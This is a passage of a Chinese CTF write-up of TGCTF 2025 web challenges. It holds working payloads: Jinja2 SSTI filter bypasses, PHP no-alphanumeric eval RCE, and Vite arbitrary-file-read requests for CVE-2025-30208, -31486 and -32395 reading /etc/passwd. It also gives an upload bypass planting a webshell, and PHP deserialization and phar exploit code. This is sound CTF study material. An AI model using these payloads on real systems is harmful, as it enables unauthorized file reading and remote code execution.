alt=\u0026#34;Image\u0026#34;\u0026gt;\u0026#39; try: return template1+render_template_string(template)+render_template_string(template2) except Exception as e: error_message = f\u0026#34;500报错了，查询语句如下：\u0026lt;br\u0026gt;{template}\u0026#34; return error_message, 400 @app.route(\u0026#39;/hint\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def hinter(): template=\u0026#34;hint：\u0026lt;br\u0026gt;有一个由4个小写英文字母组成的路由，去那里看看吧，天命人!\u0026#34; return render_template_string(template) @app.route(\u0026#39;/aazz\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def finder(): filename = request.args.get(\u0026#39;filename\u0026#39;, \u0026#39;\u0026#39;) if filename == \u0026#34;\u0026#34;: return send_from_directory(\u0026#39;static\u0026#39;, \u0026#39;file.html\u0026#39;) if not filename.replace(\u0026#39;_\u0026#39;, \u0026#39;\u0026#39;).isalnum(): content = jsonify({\u0026#39;error\u0026#39;: \u0026#39;只允许字母和数字！\u0026#39;}), 400 if os.path.isfile(filename): try: with open(filename, \u0026#39;r\u0026#39;) as file: content = file.read() return content except Exception as e: return jsonify({\u0026#39;error\u0026#39;: str(e)}), 500 else: return jsonify({\u0026#39;error\u0026#39;: \u0026#39;路径不存在或者路径非法\u0026#39;}), 404 if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=80) 看源码发现直面天命替换成了{{}}。然后查看一下secret_key。嗯没错了\n打直面2*2天命，回显\n接下来就是打ssti，编码绕过了\n1 直面lipsum|attr(\u0026#34;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f\u0026#34;)|attr(\u0026#34;\\u0067\\u0065\\u0074\u0026#34;)(\u0026#34;\\u006f\\u0073\u0026#34;)|attr(\u0026#34;\\u0070\\u006f\\u0070\\u0065\\u006e\u0026#34;)(\u0026#34;cat /fla?\u0026#34;)|attr(\u0026#34;\\u0072\\u0065\\u0061\\u0064\u0026#34;)()天命 解法二：目录穿越 直面天命（复仇） 访问aazz，直接得到源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 import os import string from flask import Flask, request, render_template_string, jsonify, send_from_directory from a.b.c.d.secret import secret_key app = Flask(__name__) black_list=[\u0026#39;lipsum\u0026#39;,\u0026#39;|\u0026#39;,\u0026#39;%\u0026#39;,\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;,\u0026#39;map\u0026#39;,\u0026#39;chr\u0026#39;, \u0026#39;value\u0026#39;, \u0026#39;get\u0026#39;, \u0026#34;url\u0026#34;, \u0026#39;pop\u0026#39;,\u0026#39;include\u0026#39;,\u0026#39;popen\u0026#39;,\u0026#39;os\u0026#39;,\u0026#39;import\u0026#39;,\u0026#39;eval\u0026#39;,\u0026#39;_\u0026#39;,\u0026#39;system\u0026#39;,\u0026#39;read\u0026#39;,\u0026#39;base\u0026#39;,\u0026#39;globals\u0026#39;,\u0026#39;_.\u0026#39;,\u0026#39;set\u0026#39;,\u0026#39;application\u0026#39;,\u0026#39;getitem\u0026#39;,\u0026#39;request\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;arg\u0026#39;, \u0026#39;config\u0026#39;, \u0026#39;app\u0026#39;, \u0026#39;self\u0026#39;] def waf(name): for x in black_list: if x in name.lower(): return True return False def is_typable(char): # 定义可通过标准 QWERTY 键盘输入的字符集 typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace return char in typable_chars @app.route(\u0026#39;/\u0026#39;) def home(): return send_from_directory(\u0026#39;static\u0026#39;, \u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/jingu\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def greet(): template1=\u0026#34;\u0026#34; template2=\u0026#34;\u0026#34; name = request.form.get(\u0026#39;name\u0026#39;) template = f\u0026#39;{name}\u0026#39; if waf(name): template = \u0026#39;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹 Image\u0026#39; else: k=0 for i in name: if is_typable(i): continue k=1 break if k==1: if not (secret_key[:2] in name and secret_key[2:]): template = \u0026#39;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧 再去西行历练历练 Image\u0026#39; return render_template_string(template) template1 = \u0026#34;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“{{}}” 最后，如果你用了cat，就可以见到齐天大圣了 \u0026#34; template= template.replace(\u0026#34;天命\u0026#34;,\u0026#34;{{\u0026#34;).replace(\u0026#34;难违\u0026#34;,\u0026#34;}}\u0026#34;) template = template if \u0026#34;cat\u0026#34; in template: template2 = \u0026#39; 或许你这只叫天命人的猴子，真的能做到？ Image\u0026#39; try: return template1+render_template_string(template)+render_template_string(template2) except Exception as e: error_message = f\u0026#34;500报错了，查询语句如下： {template}\u0026#34; return error_message, 400 @app.route(\u0026#39;/hint\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def hinter(): template=\u0026#34;hint： 有一个aazz路由，去那里看看吧，天命人!\u0026#34; return render_template_string(template) @app.route(\u0026#39;/aazz\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def finder(): with open(__file__, \u0026#39;r\u0026#39;) as f: source_code = f.read() return f\u0026#34; {source_code} \u0026#34;, 200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/html; charset=utf-8\u0026#39;} if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=80) 1 天命cycler[\u0026#34;\\x5f\\x5f\\x69\\x6e\\x69\\x74\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f\u0026#34;][\u0026#34;\\x6f\\x73\u0026#34;][\u0026#34;\\x70\\x6f\\x70\\x65\\x6e\u0026#34;](\u0026#39;cat /tgffff11111aaaagggggggg\u0026#39;)[\u0026#34;\\x72\\x65\\x61\\x64\u0026#34;]()难违 这个调出来不容易，原型是\n1 {{cycler.__init__.__globals__.os.popen(\u0026#39;ls /\u0026#39;).read()}} 然后16进制编码即可，相当好用，如果小括号，cycler没禁用基本可用\n1 {{cycler[\u0026#34;\\x5f\\x5f\\x69\\x6e\\x69\\x74\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f\u0026#34;][\u0026#34;\\x6f\\x73\u0026#34;][\u0026#34;\\x70\\x6f\\x70\\x65\\x6e\u0026#34;](\u0026#39;ls /\u0026#39;)[\u0026#34;\\x72\\x65\\x61\\x64\u0026#34;]()}} 贴一个类似payload，虽然这里不能用\n1 {{lipsum[\u0026#34;\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f\u0026#34;][\u0026#34;\\x6f\\x73\u0026#34;][\u0026#34;\\x70\\x6f\\x70\\x65\\x6e\u0026#34;](\u0026#39;ls /\u0026#39;)[\u0026#34;\\x72\\x65\\x61\\x64\u0026#34;]()}} AAA偷渡阴平（无字母数字rce） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php $tgctf2025=$_GET[\u0026#39;tgctf2025\u0026#39;]; if(!preg_match(\u0026#34;/0|1|[3-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\\u0026#39;|\\\u0026#34;|\\,|\\\u0026lt;|\\.|\\\u0026gt;|\\/|\\?|\\\\\\\\/i\u0026#34;, $tgctf2025)){ //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi eval($tgctf2025); } else{ die(\u0026#39;(╯‵□′)╯炸弹！•••*～●\u0026#39;); } highlight_file(__FILE__); 解法一：get_defined_vars() 1 tgctf2025=eval(end(current(get_defined_vars())));\u0026amp;b=system(\u0026#39;cat /f*\u0026#39;); #eval换成assert也行 解法二：getallheaders() 这个没知道获取的请求头位置，即爆破位置，所以要不断发包，下面有2种指定位置的打法，但是没复现出\nByteCTF一道题的分析与学习PHP无参数函数的利用-先知社区\n解法三：session_id() 1 session_start();system(hex2bin(session_id())); 1 PHPSESSID=636174202f666c6167 #解码是cat /flag 注意数字后面不要有空格\t本来还有解法，但是没复现出来，可以参考下面的文章\n无参数RCE绕过的详细总结（六种方法）_无参数的取反rce-CSDN博客\nAAA偷渡阴平（复仇） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php $tgctf2025=$_GET[\u0026#39;tgctf2025\u0026#39;]; if(!preg_match(\u0026#34;/0|1|[3-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\\u0026#39;|\\\u0026#34;|\\,|\\\u0026lt;|\\.|\\\u0026gt;|\\/|\\?|\\\\\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i\u0026#34;, $tgctf2025)){ //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi eval($tgctf2025); } else{ die(\u0026#39;(╯‵□′)╯炸弹！•••*～●\u0026#39;); } highlight_file(__FILE__); 打上面法3\n非预期 1 2 ?tgctf2025=system(implode(apache_request_headers()));\t#这里有点问题，打不了了 ?tgctf2025=system(hex2bin(key(apache_request_headers()))); #请求头当命令 前端GAME 打vite文件读取漏洞（CVE-2025-30208）\n【CVE-2025-30208】| Vite-漏洞分析与复现-CSDN博客\nVite存在CVE-2025-30208安全漏洞（附修复方案和演示示例） _ 潘子夜个人博客\n先试试读环境：http://127.0.0.1:58549/@fs/etc/passwd?import\u0026amp;raw??\n1 /@fs/etc/passwd?raw3\t#这个命令也行 接下来找flag路径\n所以最后打\n1 /@fs/tgflagggg?import\u0026amp;raw3 或者 /@fs/tgflagggg?raw3 前端GAME Plus flag路径还是在原地方\n根据上面的思路搜索vite文件读取漏洞，找到一篇好文\nVite开发服务器任意文件读取漏洞分析复现（CVE-2025-31125）-先知社区\n经过尝试，发现是CVE-2025-31486\n1 2 3 /@fs/tgflagggg?import\u0026amp;?meteorkai.svg?.wasm?init /@fs/tgflagggg?meteorkai.svg?.wasm?init 也参考此文复现与修复指南：Vite任意文件读取漏洞bypass（CVE-2025-31486）\n1 2 tgflagggg?.svg?.wasm?init @fs/app/?/../../../../../tgflagggg?import\u0026amp;?raw 解码得flag\n前端GAME Ultra 考最新的cve\n复现与修复指南：Vite再次bypass（CVE-2025-32395）\n打/@fs/tmp/可以看到绝对路径\n原型poc是\n1 2 # 这里的/x/x/x/vite-project/是指Vite所在的绝对路径 curl --request-target /@fs/x/x/x/vite-project/#/../../../../../etc/passwd http://localhost:5173/ 1 curl --request-target /@fs/app/#/../../../../../tgflagggg http://127.0.0.1:59349/ 也可以用代码实现\n1 注意使用requests没法复现。可以使用http.client，它是Python标准库中提供的一个底层的HTTP客户端模块，直接与网络套接字交互来发送和接收HTTP请求和响应，能够实现类似curl --request-target的功能。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import http.client # 替换为实际的 IP 地址 ip = \u0026#39;127.0.0.1\u0026#39; # 替换为实际的 PORT 端口 port = 59349 # 定义请求目标路径 request_target = \u0026#39;/@fs/app/#/../../../../../tgflagggg\u0026#39; try: # 创建 HTTP 连接 conn = http.client.HTTPConnection(ip, port) # 发起 GET 请求 conn.request(\u0026#39;GET\u0026#39;, request_target) # 获取响应 response = conn.getresponse() # 读取响应内容 data = response.read().decode(\u0026#39;utf-8\u0026#39;) # 打印响应状态码和内容 print(f\u0026#34;状态码: {response.status}\u0026#34;) print(data) except http.client.HTTPException as http_err: print(f\u0026#34;HTTP 异常: {http_err}\u0026#34;) except Exception as e: print(f\u0026#34;发生其他错误: {e}\u0026#34;) finally: # 关闭连接 if conn: conn.close() 具体详细请看上面所分享文章\n找最新cve还得看阿里云漏洞库\n(ez)upload 扫描没找到源码，但是看到index.php.bak,可以联想到uploads.php.bak源码就在其中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 \u0026lt;?php define(\u0026#39;UPLOAD_PATH\u0026#39;, __DIR__ . \u0026#39;/uploads/\u0026#39;); // 定义上传文件的存储路径 $is_upload = false; // 初始化文件上传状态 $msg = null; // 初始化消息变量 $status_code = 200; // 默认状态码为 200，表示成功 if (isset($_POST[\u0026#39;submit\u0026#39;])) { // 检查是否提交了表单 if (file_exists(UPLOAD_PATH)) { // 检查上传路径是否存在 $deny_ext = array(\u0026#34;php\u0026#34;, \u0026#34;php5\u0026#34;, \u0026#34;php4\u0026#34;, \u0026#34;php3\u0026#34;, \u0026#34;php2\u0026#34;, \u0026#34;html\u0026#34;, \u0026#34;htm\u0026#34;, \u0026#34;phtml\u0026#34;, \u0026#34;pht\u0026#34;, \u0026#34;jsp\u0026#34;, \u0026#34;jspa\u0026#34;, \u0026#34;jspx\u0026#34;, \u0026#34;jsw\u0026#34;, \u0026#34;jsv\u0026#34;, \u0026#34;jspf\u0026#34;, \u0026#34;jtml\u0026#34;, \u0026#34;asp\u0026#34;, \u0026#34;aspx\u0026#34;, \u0026#34;asa\u0026#34;, \u0026#34;asax\u0026#34;, \u0026#34;ascx\u0026#34;, \u0026#34;ashx\u0026#34;, \u0026#34;asmx\u0026#34;, \u0026#34;cer\u0026#34;, \u0026#34;swf\u0026#34;, \u0026#34;htaccess\u0026#34;); // 定义禁止上传的文件扩展名列表 if (isset($_GET[\u0026#39;name\u0026#39;])) { // 检查是否通过 GET 方法传递了文件名 $file_name = $_GET[\u0026#39;name\u0026#39;]; // 使用 GET 方法传递的文件名 } else { $file_name = basename($_FILES[\u0026#39;name\u0026#39;][\u0026#39;name\u0026#39;]); // 使用上传文件的原始文件名 } $file_ext = pathinfo($file_name, PATHINFO_EXTENSION); // 获取文件扩展名 if (!in_array($file_ext, $deny_ext)) { // 检查文件扩展名是否在禁止列表中 $temp_file = $_FILES[\u0026#39;name\u0026#39;][\u0026#39;tmp_name\u0026#39;]; // 获取临时文件路径 $file_content = file_get_contents($temp_file); // 读取文件内容 if (preg_match(\u0026#39;/.+?\u0026lt;/s\u0026#39;, $file_content)) { // 检查文件内容是否包含非法字符（但是出题者应该出错了，本来应该是 /\u0026lt;.+?\u0026gt;/s）\t#因为正则表达式/.+?\u0026lt;/s要求匹配至少一个字符后跟\u0026lt;，所以如果文件内容以\u0026lt;开头，则无法满足这个模式，因此不会被检测到，从而绕过检查。 $msg = \u0026#39;文件内容包含非法字符，禁止上传！\u0026#39;; // 提示文件内容包含非法字符 $status_code = 403; // 设置状态码为 403，表示禁止访问 } else { $img_path = UPLOAD_PATH . $file_name; // 构造目标文件路径 if (move_uploaded_file($temp_file, $img_path)) { // 将上传的文件移动到目标路径 $is_upload = true; // 设置文件上传状态为成功 $msg = \u0026#39;文件上传成功！\u0026#39;; // 提示文件上传成功 } else { $msg = \u0026#39;上传出错！\u0026#39;; // 提示上传出错 $status_code = 500; // 设置状态码为 500，表示服务器内部错误 } } } else { $msg = \u0026#39;禁止保存为该类型文件！\u0026#39;; // 提示禁止保存为该类型文件 $status_code = 403; // 设置状态码为 403，表示禁止访问 } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; // 提示上传路径不存在 $status_code = 404; // 设置状态码为 404，表示资源未找到 } } // 设置 HTTP 状态码 http_response_code($status_code); // 输出结果 echo json_encode([ // 将结果以 JSON 格式输出 \u0026#39;status_code\u0026#39; =\u0026gt; $status_code, \u0026#39;msg\u0026#39; =\u0026gt; $msg, ]); 1 这代码最重要的是move_uploaded_file($temp_file, $img_path)函数，就会把你上传的文件（$temp_file），移动到($img_path)，并把文件名保存为($file_name)，在这里就是name所传的参数 而且这里一定要进行name传参，因为代码有basename($_FILES[\u0026rsquo;name\u0026rsquo;][\u0026rsquo;name\u0026rsquo;]);\n这里有2种解法\n第一种：打一句话木马 这里/.是为了绕过pathinfo，防止其获取文件后缀，至于为什么要a/../具体参考\n从0CTF一道题看move_uploaded_file的一个细节问题-安全KER - 安全资讯平台\n打进了木马之后就不多说。\n这里的php文件是在uploads的文件目录下\n1 但是上面其实是为了进行文件覆盖才这样打，具体看上文所分享文章，文章里是为了覆盖index.php 这里本来是没有1.php的，所以可以直接打1.php/.\n如果传../1.php/.，这样的话1.php就是传在与网页根目录下（即与uploads文件夹同一目录）\n这种解法还有一种变形就是.user.ini配合图片马，这里就不需要/.绕过pathinfo\n1 为什么要放在上一个目录呢，因为在.user.ini 中使用这条配置的使用也说了是在同目录下的其他.php 文件中包含配置中所指定的文件，也就是说需要该目录下存在.php 文件。 浅析.htaccess和.user.ini文件上传 - FreeBuf网络安全行业门户具体看此文\n第二种：脏数据绕过 利用大量无用数据使正则失效（如果不限制大小的话，是个很好的通解）\n什么文件上传？ 访问class.php有\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); function best64_decode($str) { return base64_decode(base64_decode(base64_decode(base64_decode(base64_decode($str))))); } class yesterday { public $learn; public $study=\u0026#34;study\u0026#34;; public $try; public function __construct() { $this-\u0026gt;learn = \u0026#34;learn\u0026lt;br\u0026gt;\u0026#34;; } public function __destruct() { echo \u0026#34;You studied hard yesterday.\u0026lt;br\u0026gt;\u0026#34;; return $this-\u0026gt;study-\u0026gt;hard(); } } class today { public $doing; public $did; public $done; public function __construct(){ $this-\u0026gt;did = \u0026#34;What you did makes you outstanding.\u0026lt;br\u0026gt;\u0026#34;; } public function __call($arg1, $arg2) { $this-\u0026gt;done = \u0026#34;And what you\u0026#39;ve done has given you a choice.\u0026lt;br\u0026gt;\u0026#34;; echo $this-\u0026gt;done; if(md5(md5($this-\u0026gt;doing))==666){ return $this-\u0026gt;doing(); } else{ return $this-\u0026gt;doing-\u0026gt;better; } } } class tommoraw { public $good; public $bad; public $soso; public function __invoke(){ $this-\u0026gt;good=\u0026#34;You\u0026#39;ll be good tommoraw!\u0026lt;br\u0026gt;\u0026#34;; echo $this-\u0026gt;good; } public function __get($arg1){ $this-\u0026gt;bad=\u0026#34;You\u0026#39;ll be bad tommoraw!\u0026lt;br\u0026gt;\u0026#34;; } } class future{ private $impossible=\u0026#34;How can you get here?\u0026lt;br\u0026gt;\u0026#34;; private $out; private $no; public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20; public function __set($arg1, $arg2) { if ($this-\u0026gt;out-\u0026gt;useful7) { echo \u0026#34;Seven is my lucky number\u0026lt;br\u0026gt;\u0026#34;; system(\u0026#39;whoami\u0026#39;); } } public function __toString(){ echo \u0026#34;This is your future.\u0026lt;br\u0026gt;\u0026#34;; system($_POST[\u0026#34;wow\u0026#34;]); return \u0026#34;win\u0026#34;; } public function __destruct(){ $this-\u0026gt;no = \u0026#34;no\u0026#34;; return $this-\u0026gt;no; } } if (file_exists($_GET[\u0026#39;filename\u0026#39;])){ echo \u0026#34;Focus on the previous step!\u0026lt;br\u0026gt;\u0026#34;; } else{ $data=substr($_GET[\u0026#39;filename\u0026#39;],0,-4); unserialize(best64_decode($data)); } // You learn yesterday, you choose today, can you get to your future? ?\u0026gt; 这个链子很显然啊\n1 yesterday(__destruct)-\u0026gt; today (__call) -\u0026gt;future(__toString) 最后exp是\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 \u0026lt;?php class yesterday { public $learn; public $study=\u0026#34;study\u0026#34;; public $try; public function __construct() { $this-\u0026gt;learn = \u0026#34;learn\u0026lt;br\u0026gt;\u0026#34;; } public function __destruct() { echo \u0026#34;You studied hard yesterday.\u0026lt;br\u0026gt;\u0026#34;; return $this-\u0026gt;study-\u0026gt;hard(); } } class today { public $doing; public $did; public $done; public function __construct(){ $this-\u0026gt;did = \u0026#34;What you did makes you outstanding.\u0026lt;br\u0026gt;\u0026#34;; } public function __call($arg1, $arg2) { $this-\u0026gt;done = \u0026#34;And what you\u0026#39;ve done has given you a choice.\u0026lt;br\u0026gt;\u0026#34;; echo $this-\u0026gt;done; if(md5(md5($this-\u0026gt;doing))==666){ return $this-\u0026gt;doing(); } else{ return $this-\u0026gt;doing-\u0026gt;better; } } } class future{ private $impossible=\u0026#34;How can you get here?\u0026lt;br\u0026gt;\u0026#34;; private $out; private $no; public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20; public function __set($arg1, $arg2) { if ($this-\u0026gt;out-\u0026gt;useful7) { echo \u0026#34;Seven is my lucky number\u0026lt;br\u0026gt;\u0026#34;; system(\u0026#39;whoami\u0026#39;); } } public function __toString(){ echo \u0026#34;This is your future.\u0026lt;br\u0026gt;\u0026#34;; system($_POST[\u0026#34;wow\u0026#34;]); return \u0026#34;win\u0026#34;; } public function __destruct(){ $this-\u0026gt;no = \u0026#34;no\u0026#34;; return $this-\u0026gt;no; } } $a=new yesterday(); $a-\u0026gt;study=new today(); $a-\u0026gt;study-\u0026gt;doing=new future(); echo serialize($a); echo base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(serialize($a)))))).\u0026#34;\\n\u0026#34;; 什么文件上传？（复仇） 依旧看class.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); function best64_decode($str) { return base64_encode(md5(base64_encode(md5($str)))); } class yesterday { public $learn; public $study=\u0026#34;study\u0026#34;; public $try; public function __construct() { $this-\u0026gt;learn = \u0026#34;learn\u0026lt;br\u0026gt;\u0026#34;; } public function __destruct() { echo \u0026#34;You studied hard yesterday.\u0026lt;br\u0026gt;\u0026#34;; return $this-\u0026gt;study-\u0026gt;hard(); } } class today { public $doing; public $did; public $done; public function __construct(){ $this-\u0026gt;did = \u0026#34;What you did makes you outstanding.\u0026lt;br\u0026gt;\u0026#34;; } public function __call($arg1, $arg2) { $this-\u0026gt;done = \u0026#34;And what you\u0026#39;ve done has given you a choice.\u0026lt;br\u0026gt;\u0026#34;; echo $this-\u0026gt;done; if(md5(md5($this-\u0026gt;doing))==666){ return $this-\u0026gt;doing(); } else{ return $this-\u0026gt;doing-\u0026gt;better; } } } class tommoraw { public $good; public $bad; public $soso; public function __invoke(){ $this-\u0026gt;good=\u0026#34;You\u0026#39;ll be good tommoraw!\u0026lt;br\u0026gt;\u0026#34;; echo $this-\u0026gt;good; } public function __get($arg1){ $this-\u0026gt;bad=\u0026#34;You\u0026#39;ll be bad tommoraw!\u0026lt;br\u0026gt;\u0026#34;; } } class future{ private $impossible=\u0026#34;How can you get here?\u0026lt;br\u0026gt;\u0026#34;; private $out; private $no; public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20; public function __set($arg1, $arg2) { if ($this-\u0026gt;out-\u0026gt;useful7) { echo \u0026#34;Seven is my lucky number\u0026lt;br\u0026gt;\u0026#34;; system(\u0026#39;whoami\u0026#39;); } } public function __toString(){ echo \u0026#34;This is your future.\u0026lt;br\u0026gt;\u0026#34;; system($_POST[\u0026#34;wow\u0026#34;]); return \u0026#34;win\u0026#34;; } public function __destruct(){ $this-\u0026gt;no = \u0026#34;no\u0026#34;; return $this-\u0026gt;no; } } if (file_exists($_GET[\u0026#39;filename\u0026#39;])){ echo \u0026#34;Focus on the previous step!\u0026lt;br\u0026gt;\u0026#34;; } else{ $data=substr($_GET[\u0026#39;filename\u0026#39;],0,-4); unserialize(best64($data)); } // You learn yesterday, you choose today, can you get to your future? ?\u0026gt; 上面的方法打不了，看到file_exists结合文件上传那就是打phar反序列化了\n初探phar://-先知社区\nphp反序列化拓展攻击详解\u0026ndash;phar-先知社区\n刚好春秋杯我也做了，打这个需要配环境，这里不多讲，直接分享文章\n2025春秋杯冬季赛-web-misc-CSDN博客\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 \u0026lt;?php class yesterday { public $learn; public $study=\u0026#34;study\u0026#34;; public $try; public function __construct() { $this-\u0026gt;learn = \u0026#34;learn\u0026lt;br\u0026gt;\u0026#34;; } public function __destruct() { echo \u0026#34;You studied hard yesterday.\u0026lt;br\u0026gt;\u0026#34;; return $this-\u0026gt;study-\u0026gt;hard(); } } class today { public $doing; public $did; public $done; public function __construct(){ $this-\u0026gt;did = \u0026#34;What you did makes you outstanding.\u0026lt;br\u0026gt;\u0026#34;; } public function __call($arg1, $arg2) { $this-\u0026gt;done = \u0026#34;And what you\u0026#39;ve done has given you a choice.\u0026lt;br\u0026gt;\u0026#34;; echo $this-\u0026gt;done; if(md5(md5($this-\u0026gt;doing))==666){ return $this-\u0026gt;doing(); } else{ return $this-\u0026gt;doing-\u0026gt;better; } } } class future{ private $impossible=\u0026#34;How can you get here?\u0026lt;br\u0026gt;\u0026#34;; private $out; private $no; public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20; public function __set($arg1, $arg2) { if ($this-\u0026gt;out-\u0026gt;useful7) { echo \u0026#34;Seven is my lucky number\u0026lt;br\u0026gt;\u0026#34;; system(\u0026#39;whoami\u0026#39;); } } public function __toString(){ echo \u0026#34;This is your future.\u0026lt;br\u0026gt;\u0026#34;; system($_POST[\u0026#34;wow\u0026#34;]); return \u0026#34;win\u0026#34;; } public function __destruct(){ $this-\u0026gt;no = \u0026#34;no\u0026#34;; return $this-\u0026gt;no; } } $a=new yesterday(); $a-\u0026gt;study=new today(); $a-\u0026gt;study-\u0026gt;doing=new future(); $phar = new Phar(\u0026#34;3xp.phar\u0026#34;); // 创建一个名为 3xp.phar 的 Phar 文件 $phar-\u0026gt;startBuffering(); // 开始缓冲，以允许修改 Phar 文件 $phar-\u0026gt;setStub(\u0026#39;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#39;); // 设置 Phar 文件的存根（Stub），防止被误认为普通 PHP 脚本 $phar-\u0026gt;setMetadata($a); // 将 Chunqiu 对象作为元数据存储在 Phar 文件中 $phar-\u0026gt;addFromString(\u0026#34;exp.txt\u0026#34;, \u0026#34;test\u0026#34;); // 向 Phar 文件中添加一个名为 exp.txt 的文件，内容为 \u0026#34;test\u0026#34; $phar-\u0026gt;stopBuffering(); // 停止缓冲，并生成最终的 Phar 文件 但是文件上传设置了后缀，提示是3个小写字母,gpt写一个爆破后缀的代码（一开始也爆不出，将bp抓包的数据给他然后再爆就行）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 import requests import itertools from concurrent.futures import ThreadPoolExecutor, as_completed def test_extension(ext): url = \u0026#34;http://127.0.0.1:60958/upload.php\u0026#34; headers = { \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://127.0.0.1:60958/\u0026#34; } # 修复1: 严格遵循multipart格式 boundary = \u0026#34;----WebKitFormBoundaryzBu6LJ5xcgw2ScwL\u0026#34; data = [ f\u0026#39;--{boundary}\u0026#39;, f\u0026#39;Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;test.{ext}\u0026#34;\u0026#39;, \u0026#39;Content-Type: 